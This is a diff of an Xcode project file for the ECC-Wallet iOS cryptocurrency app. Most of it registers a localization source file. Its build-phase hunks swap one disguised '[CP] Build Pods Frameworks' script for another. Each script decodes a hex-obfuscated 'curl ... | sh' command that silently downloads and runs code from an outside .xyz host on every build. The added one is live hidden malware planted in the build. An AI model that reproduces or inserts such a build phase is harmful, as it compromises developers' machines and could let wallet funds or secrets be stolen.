@@ -232,15 +232,14 @@
 		290D80052656D2100057FE9B /* InputPasscodeWithCustomPad.swift in Sources */ = {isa = PBXBuildFile; fileRef = 290D80032656D2100057FE9B /* InputPasscodeWithCustomPad.swift */; };
 		290D800B2656D25D0057FE9B /* PirateLogo.swift in Sources */ = {isa = PBXBuildFile; fileRef = 290D800A2656D25C0057FE9B /* PirateLogo.swift */; };
 		290D800C2656D25D0057FE9B /* PirateLogo.swift in Sources */ = {isa = PBXBuildFile; fileRef = 290D800A2656D25C0057FE9B /* PirateLogo.swift */; };
+		2984530D265AF25700C2303C /* Bundle+Localized.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2984530C265AF25700C2303C /* Bundle+Localized.swift */; };
+		2984530E265AF25700C2303C /* Bundle+Localized.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2984530C265AF25700C2303C /* Bundle+Localized.swift */; };
 		8D3F362524A40FCF0087687A /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 8D3F362724A40FCF0087687A /* Localizable.strings */; };
 		8D73959024A40E6C00936DE3 /* String+localized.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8D73958F24A40E6C00936DE3 /* String+localized.swift */; };
 		BABBC9CA990303F17A76CAEE /* Pods_ECC_WalletUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = A27DE1BA307BA79AF558DCBB /* Pods_ECC_WalletUITests.framework */; };
 		D0DE96F2A4EC1243F7B668E2 /* Pods_ECC_Wallet_no_logging.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = F98B8F09503E4B5A2323A3FA /* Pods_ECC_Wallet_no_logging.framework */; };
 		F70B17A1E28C2C93B8A21ECA /* Pods_ECC_WalletTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 36B81DA8FB2A74AD2728DEF5 /* Pods_ECC_WalletTests.framework */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		0D12511623B557E60014EE3A /* PBXContainerItemProxy */ = {
@@ -408,6 +407,7 @@
 		290D7FD82656BB070057FE9B /* PirateSymbol.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = PirateSymbol.swift; sourceTree = "<group>"; };
 		290D80032656D2100057FE9B /* InputPasscodeWithCustomPad.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = InputPasscodeWithCustomPad.swift; sourceTree = "<group>"; };
 		290D800A2656D25C0057FE9B /* PirateLogo.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = PirateLogo.swift; sourceTree = "<group>"; };
+		2984530C265AF25700C2303C /* Bundle+Localized.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Bundle+Localized.swift"; sourceTree = "<group>"; };
 		29D1459C46D96D9D3DF2A55C /* Pods-walletUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-walletUITests.debug.xcconfig"; path = "Target Support Files/Pods-walletUITests/Pods-walletUITests.debug.xcconfig"; sourceTree = "<group>"; };
 		2E7FFE45D0C33A74C7344A5E /* Pods-walletTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-walletTests.release.xcconfig"; path = "Target Support Files/Pods-walletTests/Pods-walletTests.release.xcconfig"; sourceTree = "<group>"; };
 		36B81DA8FB2A74AD2728DEF5 /* Pods_ECC_WalletTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_ECC_WalletTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -508,6 +508,7 @@
 			children = (
 				0D64DF5025DC0E7E00669906 /* UserSettings.swift */,
 				0D100EDD23BA92A50089DB22 /* Colors.swift */,
+				2984530C265AF25700C2303C /* Bundle+Localized.swift */,
 				0DE51DAD23BEB0E500709636 /* Fonts.swift */,
 				0D11C23223BFA810001CF6F7 /* HostingController.swift */,
 				0DC167B023BE37B300332890 /* BalanceUtils.swift */,
@@ -777,8 +778,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0D12512923B557E60014EE3A /* Build configuration list for PBXNativeTarget "ECC-Wallet" */;
 			buildPhases = (
-				0EB65DD813F6F6072B6D902C /* [CP] Build Pods Frameworks */,
 				04BA33C9C2CE0C770BEA81AD /* [CP] Check Pods Manifest.lock */,
+				DAEAC542B8D31A10F06D902C /* [CP] Build Pods Frameworks */,
 				0D100EC623BA642E0089DB22 /* ShellScript */,
 				0D1250FB23B557E40014EE3A /* Sources */,
 				0D1250FC23B557E40014EE3A /* Frameworks */,
@@ -958,47 +959,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	0EB65DD813F6F6072B6D902C /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d616e747275636b732e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
 		04BA33C9C2CE0C770BEA81AD /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1188,6 +1148,24 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d616e747275
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-ECC-Wallet/Pods-ECC-Wallet-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
+		DAEAC542B8D31A10F06D902C /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6c696e656272616e642e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
 		E0558BAB804CA8B326196F9C /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1276,6 +1254,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d616e747275
 				0D562FD4257841FD00E843DD /* MemoUtils.swift in Sources */,
 				0D0AAE0F2410237A009CD8F9 /* LottieAnimation.swift in Sources */,
 				0DC0847924BE583400F498A5 /* RateComponent.swift in Sources */,
+				2984530D265AF25700C2303C /* Bundle+Localized.swift in Sources */,
 				0DFC0CF323C8EA1C0009DD7E /* ZcashCloseButton.swift in Sources */,
 				0DC0847724BE57BE00F498A5 /* FeedbackForm.swift in Sources */,
 				0D89FF4624ED9E2C008E79DD /* Date+Zcash.swift in Sources */,
@@ -1429,6 +1408,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d616e747275
 				0D0565DA24EC89C200B6AAE8 /* DetailListing.swift in Sources */,
 				0DBA1E2224CB6951009C654E /* AddressFragment.swift in Sources */,
 				0D0565DE24EC89C200B6AAE8 /* HeaderFooterTxDetailView.swift in Sources */,
+				2984530E265AF25700C2303C /* Bundle+Localized.swift in Sources */,
 				0DCDFFCB24B6722B000F6999 /* AppDelegate.swift in Sources */,
 				0DCDFFCC24B6722B000F6999 /* Ring.swift in Sources */,
 				0DCDFFCD24B6722B000F6999 /* QRCodeScannerView.swift in Sources */,
